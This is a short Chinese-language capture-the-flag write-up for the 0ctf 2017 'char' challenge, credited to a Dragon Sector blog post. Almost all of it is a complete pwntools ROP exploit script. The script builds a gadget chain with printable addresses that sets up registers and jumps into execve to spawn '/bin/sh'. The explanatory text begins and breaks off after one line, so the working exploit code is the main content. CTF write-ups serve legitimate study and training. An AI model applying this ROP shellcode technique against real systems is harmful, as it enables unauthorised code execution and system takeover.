# 解析char-130

> 参考了[http://blog.dragonsector.pl/2017/03/0ctf-2017-char-shellcoding-132.html](http://blog.dragonsector.pl/2017/03/0ctf-2017-char-shellcoding-132.html)

> 主要解法
```python
from pwn import *

rop = "A" * 32          # <1>

# set ecx = 0
rop += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret <2>
rop += p32(0x41414141)
rop += p32(0x41414141)
rop += p32(0x556d2a51) # pop ecx ; add al, 0xa ; ret <3>
rop += p32(0x41414141)
rop += p32(0x55655b4c) # sub ecx, edx ; add esp, 0x4c ; mov eax, ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  <4>
rop += "A" * 0x4c
rop += p32(0x41414141) * 4

# set eax = 0x5563704d (ret)
rop += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret  <5>
rop += p32(0x5563704d) # edx
rop += p32(0x41414141) # edi
rop += p32(0x555b3454) # mov eax, edx ; ret  <6>

# ebx = '...///////bin/sh'
rop += p32(0x55643026) # push eax ; push esp ; xor eax, eax ; pop ebx ; ret  <7>
rop += p32(0x556a3457) # xor eax, eax ; ret <8>
rop += p32(0x556c6864) # inc eax ; ret 0 <9>
rop += p32(0x556d2860) * 2 # add ah, al ; ret  <10>
rop += p32(0x55634e43) # add bh, ah ; ret <11>

# set edx = 0
rop += p32(0x55617940) # mov edx, 0xffffffff ; cmovne eax, edx ; ret <12>
rop += p32(0x555e7a4b) # inc edx ; add al, 0x5f ; ret  <13>

# esi = execve+0x23 0x55616603
rop += p32(0x55623c37) # pop esi ; ret  <14>
rop += p32(0x55616621) 
rop += p32(0x556f4237) * (0x21-0x3) # dec esi <15>
rop += p32(0x556e552c) # push esi; ret <16>

rop += "/" * 500 + "/bin/sh"
print('%s'%(rop))
```


> 这里的难度在于几点：
> 